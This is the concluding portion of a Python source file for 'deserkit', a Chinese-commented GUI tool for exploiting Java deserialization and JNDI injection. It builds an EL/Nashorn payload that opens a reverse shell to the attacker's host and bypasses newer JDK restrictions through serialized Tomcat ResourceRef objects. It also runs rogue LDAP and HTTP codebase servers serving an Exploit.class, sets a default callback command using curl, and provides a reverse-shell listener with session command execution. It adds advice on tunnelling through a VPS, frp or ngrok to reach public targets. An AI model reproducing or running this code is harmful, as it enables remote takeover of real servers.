            } catch (Exception e) {
            }
        }).start();
    }
}
"""


def build_bypass_el(lhost, lport, http_port):
    """高版本 JDK（8u191+ trustURLCodebase=false）绕过：
    BeanFactory + ELProcessor + forceString=eval，EL 里用 Nashorn JS 反弹 shell。
    JS 内只用双引号（EL 单引号字符串包裹），不依赖 bash /dev/tcp。"""
    js = (
        "try{var m=new java.net.Socket(\"%s\",%d);"
        "var o=m.getOutputStream();"
        "o.write(java.lang.String(\"GET /bypass-ok HTTP/1.0\\r\\n\\r\\n\").getBytes(\"UTF-8\"));"
        "o.flush();m.close();}catch(e){}"
        "var s=new java.net.Socket(\"%s\",%d);"
        "var p=new java.lang.ProcessBuilder([\"/bin/sh\"]).redirectErrorStream(true).start();"
        "var i=p.getInputStream(),o2=p.getOutputStream();"
        "new java.lang.Thread(function(){var a=java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE,4096),b;"
        "try{while((b=i.read(a))>0){s.getOutputStream().write(a,0,b);s.getOutputStream().flush();}}catch(e){}}).start();"
        "var a2=java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE,4096),b2,ins=s.getInputStream();"
        "try{while((b2=ins.read(a2))>0){o2.write(a2,0,b2);o2.flush();}}catch(e){}"
    ) % (lhost, int(http_port), lhost, int(lport))
    return ('"".getClass().forName("javax.script.ScriptEngineManager")'
            '.newInstance().getEngineByName("JavaScript").eval(\'%s\')' % js)


def generate_serial_ref(lhost, lport, http_port, sleep=False):
    """用本地 Java 复刻类生成序列化 ResourceRef（BeanFactory 高版本绕过）。
    B=新层级 ResourceRef→AbstractRef→Reference（Tomcat 8.5.7x+/9.0.4x+），A=老层级直连 Reference。
    返回 {variant: bytes}；Java 不可用时返回 {}。"""
    out = {}
    java = shutil.which("java")
    if not java:
        return out
    for v in ("B", "A"):
        cp = os.path.join(HERE, "tools", "serref" + v)
        if not os.path.isdir(cp):
            continue
        try:
            cmd = [java, "-cp", cp, "org.apache.naming.SerRef",
                   lhost, str(lport), str(http_port)]
            if sleep:
                cmd.append("sleep")
            r = subprocess.run(cmd, capture_output=True, timeout=60)
            b64 = r.stdout.decode().strip()
            if b64.startswith("rO0AB"):
                out[v] = base64.b64decode(b64)
        except Exception as e:
            log("SerRef[%s] 生成失败: %s" % (v, e))
    return out


def generate_serial_ref_el(el, lhost, lport, http_port):
    """按指定的**纯 EL** 生成序列化 ResourceRef（BeanFactory 高版本绕过）。

    为什么必须走序列化 ResourceRef：Tomcat 的 BeanFactory 要求
    `obj instanceof ResourceRef`，LDAP 普通 Reference 分支会被它直接忽略（返回 null），
    于是 ELProcessor.eval 根本不会被调用。所以 Java 可用时一定要用本函数。

    为什么必须纯 EL：容器内常无 Nashorn/JavaScript 引擎，
    `getEngineByName("JavaScript")` 与 `new` 运算符都会让 eval 抛错。
    """
    out = {}
    java = shutil.which("java")
    if not java:
        return out
    for v in ("B", "A"):
        cp = os.path.join(HERE, "tools", "serref" + v)
        if not os.path.isdir(cp):
            continue
        try:
            r = subprocess.run([java, "-cp", cp, "org.apache.naming.SerRef",
                                lhost, str(lport), str(http_port), "EL=" + el],
                               capture_output=True, timeout=60)
            b64 = r.stdout.decode().strip()
            if b64.startswith("rO0AB"):
                out[v] = base64.b64decode(b64)
        except Exception as e:
            log("SerRef[EL][%s] 生成失败: %s" % (v, e))
    return out


def jndi_start(p):
    j = STATE["jndi"]
    if j["on"]:
        return {"ok": True, "msg": "已在运行",
                "ldap_port": j["ldap_port"], "http_port": j["http_port"]}
    mode = p.get("mode") or j.get("mode") or "classic"
    cmd = p.get("cmd", "") or j.get("cmd", "") or "curl http://CALLBACK/deserkit"
    lhost = p.get("lhost") or src_ip_for(p.get("target", "")) or "127.0.0.1"
    ldap_req = int(p.get("ldap_port") or j.get("ldap_port") or PORT_DEFAULT["ldap"])
    http_req = int(p.get("http_port") or j.get("http_port") or PORT_DEFAULT["http"])
    j.update({"cmd": cmd, "lhost": lhost, "mode": mode,
              "ldap_port": ldap_req, "http_port": http_req,
              "factory": p.get("factory") or "Exploit", "err": ""})
    lport = int(p.get("lport") or (STATE.get("listener", {}).get("port") or PORT_DEFAULT["listener"]))
    notes = []

    # serrefA/B 层级选择：给了 tomcat_version 就按版本定死一个变体，不再来回试；
    # 没给且给了 target 就顺手探一次版本（和 tomcat.probe 同款逻辑）。
    tv = (p.get("tomcat_version") or p.get("version") or "").strip()
    if not tv and p.get("target") and str(p.get("auto_version", "1")).strip() not in ("0", "false", "no"):
        try:
            tv, _ = _tomcat_version(normalize(p.get("target", "")), 5)
        except Exception:
            tv = ""
    pick = p.get("ser_variant", "").strip().upper()
    if tv and pick not in ("A", "B"):
        pick, _ = _serref_variant_for(tv)
    j["tomcat_version"] = tv
    j["ser_variant"] = pick if pick in ("A", "B") else ""
    j["ser_idx"] = 0
    j["ser_used"] = ""
    if tv and j["ser_variant"]:
        notes.append("目标 Tomcat %s → 固定下发 serref%s（不必再手动试另一条）"
                     % (tv, j["ser_variant"]))
    elif mode == "bypass":
        notes.append("未拿到目标版本 → 按 B→A 顺序轮流下发（每次请求换一个），"
                     "看哪个能触发就是哪条；想定死就把 tomcat_version 填上")

    # ---- 1) 先占位绑定（失败自动向后探测端口），拿到真实端口后再算 codebase ----
    srv, ldap_port, info_l = bind_tcp_server(
        _LDAPServer, LDAPHandler, ldap_req, role="JNDI/LDAP")
    if srv is None:
        msg = info_l.get("advice") or ("LDAP 端口 %d 绑定失败" % ldap_req)
        return {"ok": False, "msg": msg, "advice": info_l.get("advice", ""),
                "kind": info_l.get("kind", "other"),
                "tried": info_l.get("tried", []), "notes": notes, "port": ldap_req}
    notes += info_l["notes"]
    httpd, http_port, info_h = bind_tcp_server(
        _HTTPServer, ClassHTTPHandler, http_req, role="JNDI/HTTP(codebase)")
    if httpd is None:
        try:
            srv.server_close()
        except Exception:
            pass
        msg = info_h.get("advice") or ("HTTP 端口 %d 绑定失败" % http_req)
        return {"ok": False, "msg": msg, "advice": info_h.get("advice", ""),
                "kind": info_h.get("kind", "other"),
                "tried": info_h.get("tried", []), "notes": notes, "port": http_req}
    notes += info_h["notes"]
    j.update({"ldap_port": ldap_port, "http_port": http_port,
              "ldap_srv": srv, "http_srv": httpd})
    j["payload_url"] = "http://%s:%s/" % (lhost, http_port)

    # ---- 2) Web 根目录：优先运行时目录，不可写时降级 ----
    webroot = runtime_path("_jndi")
    try:
        os.makedirs(webroot, exist_ok=True)
    except Exception:
        webroot = ""
    if (not webroot) or (not _dir_writable(webroot)):
        alt = os.path.join(tempfile.gettempdir(), "deserkit-jndi")
        if _dir_writable(alt):
            webroot = alt
            notes.append("运行时目录不可写，JNDI 临时 Web 根目录已降级到 %s" % webroot)
        else:
            webroot = HERE
            notes.append("运行时目录不可写，JNDI Web 根目录回落到脚本目录（只读，无法编译；"
                         "请把自备的 Exploit.class 放到该目录）")
    j["webroot"] = webroot

    # ---- 3) 生成并编译 Exploit.class（Java 原生 Socket 反弹，不依赖 bash /dev/tcp）----
    codebase = j["payload_url"]
    if not codebase.endswith("/"):
        codebase += "/"
    compiled = False
    javac = shutil.which("javac")
    if mode == "bypass":
        # 高版本绕过：序列化 ResourceRef（BeanFactory 只认 ResourceRef）
        j["ser"] = generate_serial_ref(lhost, lport, j["http_port"],
                                       sleep=bool(p.get("sleep")))
        j["ser_idx"] = 0
        j["el"] = build_bypass_el(lhost, lport, j["http_port"])
        j["lport"] = lport
        compiled = None
        log("JNDI 高版本绕过模式：序列化 ResourceRef=%s（反弹 %s:%s）" % (
            "/".join(j["ser"].keys()) or "无(java缺失,退化为普通Reference)", lhost, lport))
    elif javac:
        try:
            src = os.path.join(webroot, "Exploit.java")
            with open(src, "w", encoding="utf-8") as f:
                f.write(EXPLOIT_JAVA
                        .replace("%CMD%", cmd.replace("\\", "\\\\").replace('"', '\\"'))
                        .replace("%CODEBASE%", codebase)
                        .replace("%LHOST%", lhost)
                        .replace("%LPORT%", str(lport)))
            r = subprocess.run([javac, "--release", "8", "-nowarn", "-d", webroot, src],
                               capture_output=True, timeout=120)
            compiled = os.path.isfile(os.path.join(webroot, "Exploit.class"))
            if not compiled:
                r2 = subprocess.run([javac, "-nowarn", "-d", webroot, src], capture_output=True, timeout=120)
                compiled = os.path.isfile(os.path.join(webroot, "Exploit.class"))
                j["err"] = (r.stderr or r2.stderr).decode("utf-8", "ignore")[:300]
        except Exception as e:
            j["err"] = "%s: %s" % (type(e).__name__, e)
    j["compiled"] = compiled
    # ---- 4) 绑定已在步骤 1 完成，这里只起服务线程 ----
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    j["on"] = True
    log("JNDI 服务启动 ldap://%s:%s  codebase=%s" % (lhost, j["ldap_port"], j["payload_url"]))
    msg = "已启动"
    if notes:
        msg += "（有自动降级，详见提示）"
    return {"ok": True, "msg": msg,
            "ldap": "ldap://%s:%s/%s" % (lhost, j["ldap_port"], j["factory"]),
            "codebase": j["payload_url"], "compiled": compiled, "err": j["err"],
            "ldap_port": ldap_port, "http_port": http_port,
            "requested_ldap_port": ldap_req, "requested_http_port": http_req,
            "webroot": webroot, "runtime_dir": runtime_dir(),
            "notes": notes, "advice": "\n".join(notes)}


def jndi_stop(p=None):
    j = STATE["jndi"]
    for k in ("ldap_srv", "http_srv"):
        try:
            if j.get(k):
                j[k].shutdown()
                j[k].server_close()
        except Exception:
            pass
    j["on"] = False
    j["ldap_srv"] = j["http_srv"] = None
    log("JNDI 服务已停止")
    return {"ok": True, "msg": "已停止"}


# ============================================================
# 反弹 Shell 监听
# ============================================================
def listener_start(p):
    st = STATE["listener"]
    if st["on"]:
        return {"ok": True, "msg": "已在监听", "port": st.get("port")}
    req = int(p.get("port") or st.get("port") or PORT_DEFAULT["listener"])
    # 端口被占 / 被 Windows 保留区间拦住时，自动向后探测下一个可用端口
    s, port, info = bind_socket(req, role="反弹Shell监听")
    if s is None:
        return {"ok": False, "msg": info.get("advice") or ("监听端口 %d 绑定失败" % req),
                "advice": info.get("advice", ""), "kind": info.get("kind", "other"),
                "tried": info.get("tried", []), "port": req}
    st.update({"on": True, "port": port, "sock": s})
    notes = info.get("notes") or []

    def accept_loop():
        while STATE["listener"]["on"]:
            try:
                c, addr = s.accept()
            except Exception:
                break
            sid = hashlib.md5(("%s%s" % (addr, time.time())).encode()).hexdigest()[:8]
            with SESS_LOCK:
                STATE["sessions"][sid] = {"sock": c, "addr": addr[0], "ts": now(), "open": True}
            log("反弹会话上线 %s (%s:%s)" % (sid, addr[0], addr[1]), "hit")
            add_callback("ReverseShell", addr[0], "会话 %s 上线" % sid)

    threading.Thread(target=accept_loop, daemon=True).start()
    log("监听 0.0.0.0:%d" % port)
    msg = "监听 0.0.0.0:%d" % port
    if notes:
        msg += "（原端口 %d 不可用，已自动切换）" % req
    return {"ok": True, "msg": msg, "port": port, "requested_port": req,
            "notes": notes, "advice": "\n".join(notes)}


def listener_stop(p=None):
    st = STATE["listener"]
    st["on"] = False
    try:
        if st.get("sock"):
            st["sock"].close()
    except Exception:
        pass
    with SESS_LOCK:
        for s in STATE["sessions"].values():
            try:
                s["sock"].close()
            except Exception:
                pass
        STATE["sessions"] = {}
    log("监听已停止")
    return {"ok": True, "msg": "已停止"}


def shell_cmd(p):
    sid = p.get("sid", "")
    cmd = p.get("cmd", "")
    with SESS_LOCK:
        s = STATE["sessions"].get(sid)
    if not s:
        return {"ok": False, "output": "会话不存在"}
    try:
        s["sock"].sendall((cmd + "\n").encode())
        s["sock"].settimeout(3.0)
        buf = b""
        t0 = time.time()
        while time.time() - t0 < 3.0:
            try:
                d = s["sock"].recv(65535)
            except socket.timeout:
                break
            if not d:
                break
            buf += d
            if len(buf) > 200000:
                break
        return {"ok": True, "output": buf.decode("utf-8", "ignore")}
    except Exception as e:
        return {"ok": False, "output": "%s: %s" % (type(e).__name__, e)}


# ============================================================
# HTTP 服务（API + 静态页）
# ============================================================
class APIHandler(httpsrv.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def _json(self, obj, code=200):
        b = json.dumps(obj, ensure_ascii=False).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def _file(self, path, ctype):
        try:
            data = open(path, "rb").read()
        except Exception:
            self.send_error(404)
            return
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_HEAD(self):
        if self.path.startswith("/cb/"):
            add_callback("HTTP", self.client_address[0], self.path)
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if path.startswith("/cb/"):
            add_callback("HTTP", self.client_address[0],
                         "%s (UA=%s)" % (path, self.headers.get("User-Agent", "-")[:60]))
            self._json({"ok": True})
            return
        if path == "/" or path == "/exploit.html":
            self._file(os.path.join(HERE, "exploit.html"), "text/html; charset=utf-8")
            return
        if path == "/index.html":
            self._file(os.path.join(HERE, "index.html"), "text/html; charset=utf-8")
            return
        if path == "/api/status":
            j = STATE["jndi"]
            with SESS_LOCK:
                sess = [{"sid": k, "addr": v["addr"], "ts": v["ts"]}
                        for k, v in STATE["sessions"].items()]
            self._json({"jndi": {k: j.get(k) for k in
                                 ("on", "ldap_port", "http_port", "cmd", "lhost",
                                  "payload_url", "compiled", "err", "factory")},
                        "listener": {"on": STATE["listener"]["on"],
                                     "port": STATE["listener"].get("port")},
                        "sessions": sess,
                        "callbacks": STATE["callbacks"][-100:],
                        "log": STATE.get("_log", [])[-100:],
                        "runtime": {"dir": runtime_dir(), "note": runtime_note(),
                                    "writable": bool(_RUNTIME["writable_here"]),
                                    "admin": is_admin(),
                                    "gui_port": STATE.get("gui_port"),
                                    "pid": os.getpid()}})
            return
        if path == "/api/myip":
            q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            tgt = (q.get("target") or [""])[0]
            host = ""
            try:
                host = (urllib.parse.urlparse(tgt).hostname
                        if "//" in tgt else tgt.split(":")[0]) or ""
            except Exception:
                pass
            ip = src_ip_for(tgt) if host else ""
            pub = bool(host and not is_private_ip(host))
            if not ip:
                ip = local_ips()[0]
            advice = ""
            if pub:
                advice = ("目标是公网地址，而本机出口 IP %s 是内网地址 → 目标无法回连。"
                          "必须用：①云服务器 VPS（推荐）②frp/ngrok/natapp 内网穿透 "
                          "③路由器端口映射 ④不出网链路改走 BCEL/TemplatesImpl/回显链。" % ip)
            elif ip:
                advice = "本机去往 %s 走的是 %s（同网段网卡），用它作为攻击机 IP 即可。" % (host, ip)
            self._json({"ip": ip, "all": local_ips(), "host": host,
                        "public_target": pub, "advice": advice})
            return
        if path == "/api/env":
            try:
                self._json(env_selfcheck())
            except Exception as e:
                self._json({"ips": local_ips(), "java": bool(shutil.which("java")),
                            "javac": bool(shutil.which("javac")), "yso": find_ysoserial(),
                            "comps": [{"id": k, "name": CHECKS[k].__name__} for k in ALL],
                            "err": "环境自检异常: %s: %s" % (type(e).__name__, e)})
            return
        self.send_error(404)

    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path
        try:
            n = int(self.headers.get("Content-Length") or 0)
            body = json.loads(self.rfile.read(n).decode("utf-8", "ignore")) if n else {}
        except Exception:
            body = {}
        try:
            if path == "/api/scan":
                self._json(do_scan(body.get("target", ""), body.get("comps"),
                                   int(body.get("timeout", 8)), body.get("dnslog", "")))
            elif path == "/api/exploit":
                fn = EXPLOITS.get(body.get("vuln", ""))
                if not fn:
                    self._json({"ok": False, "output": "未知动作 %s" % body.get("vuln")})
                else:
                    log("执行 %s → %s" % (body.get("vuln"), body.get("target")))
                    self._json(fn(body.get("target", ""), body.get("params", {})))
            elif path == "/api/jndi":
                self._json(jndi_start(body) if body.get("action") == "start" else jndi_stop(body))
            elif path == "/api/listener":
                self._json(listener_start(body) if body.get("action") == "start" else listener_stop(body))
            elif path == "/api/shellcmd":
                self._json(shell_cmd(body))
            else:
                self._json({"ok": False, "output": "未知接口"}, 404)
        except Exception as e:
            self._json({"ok": False, "output": "%s: %s" % (type(e).__name__, e)}, 500)


class _MainServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


def _deserkit_running_on(host, port):
    """探测某个端口上是否已经有一个 deserkit 在跑（按 /api/env 的响应判定）。"""
    try:
        with urllib.request.urlopen("http://%s:%d/api/env" % (host, port), timeout=2) as r:
            body = r.read(8192)
            return b'"comps"' in body or b'"ips"' in body
    except Exception:
        return False


def main():
    ap = argparse.ArgumentParser(description="deserkit 图形化利用工具")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=PORT_DEFAULT["gui"])
    ap.add_argument("--no-browser", action="store_true")
    ap.add_argument("--tries", type=int, default=PORT_TRIES,
                    help="端口不可用时向后探测的候选端口数（默认 %d）" % PORT_TRIES)
    ap.add_argument("--strict-port", action="store_true",
                    help="端口不可用时直接退出，不做备选端口探测")
    a = ap.parse_args()
    probe_host = "127.0.0.1" if a.host in ("0.0.0.0", "", "*") else a.host

    # 单实例守护：候选端口里已有本工具在跑时直接退出，避免"改了代码却跑的旧逻辑"。
    for cand in range(a.port, min(a.port + 5, 65536)):
        if _deserkit_running_on(probe_host, cand):
            print("[!] 端口 %d 已有一个 deserkit 实例在运行。"
                  "\n    重复启动会导致你改的代码不生效！请先用旧的窗口/进程，或："
                  "\n    netstat -ano | findstr :%d  →  taskkill /PID <pid> /F" % (cand, cand))
            return 1

    # 绑定主服务：端口被占 / 被 Windows 保留区间拦住时自动向后探测
    tries = 1 if a.strict_port else max(1, int(a.tries))
    alt_host = "127.0.0.1" if a.host == "0.0.0.0" else None
    srv, port, info = bind_tcp_server(_MainServer, APIHandler, a.port, a.host,
                                      tries=tries, role="GUI 服务", alt_host=alt_host)
    if srv is None:
        print("[!] GUI 服务端口 %d（及其后 %d 个候选端口）均无法绑定：" % (a.port, tries))
        print(info.get("advice") or "")
        for t in (info.get("tried") or [])[:5]:
            print("    尝试 %s:%d → %s" % (t.get("host"), t.get("port"), t.get("err")))
        print("    换个端口再试：python gui_server.py --port %d" % (a.port + tries))
        return 1
    STATE["gui_port"] = port
    STATE["gui_host"] = info["host"]
    url = "http://%s:%d/" % (probe_host, port)
    rd = runtime_dir()
    note = runtime_note()
    env = env_selfcheck(port)
    bad_ports = [(v["label"], v["port"], v["kind"]) for v in env["ports"].values()
                 if not v["ok"]]

    print("=" * 62)
    print("  deserkit 图形化利用工具")
    print("  界面: %s" % url)
    for n in info["notes"]:
        print("  [自动降级] %s" % n)
    print("  本机IP: %s" % ", ".join(local_ips()))
    print("  java: %s  javac: %s  ysoserial: %s"
          % (bool(shutil.which("java")), bool(shutil.which("javac")),
             find_ysoserial() or "未放置"))
    print("  Python: %s (%s)  系统: %s  管理员/root: %s"
          % (platform.python_version(), sys.executable or "-", env["os"],
             "是" if env["admin"] else "否"))
    print("  运行时目录: %s%s" % (rd, "  ← 只读降级路径" if note else ""))
    if bad_ports:
        print("  端口预检失败: %s" % ", ".join(
            "%s(%d)=%s" % (lb, p, kd) for lb, p, kd in bad_ports))
        print("    服务本身会自动换端口；完整诊断见界面「环境自检」或详情页。")
    else:
        print("  端口预检: 全部可用")
    print("  Ctrl+C 退出")
    print("=" * 62)
    if note:
        print("[!] %s" % note)
    if not a.no_browser:
        threading.Timer(0.8, lambda: webbrowser.open(url)).start()
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\n已退出")
        try:
            jndi_stop()
            listener_stop()
        except Exception:
            pass
    return 0


if __name__ == "__main__":
    sys.exit(main() or 0)
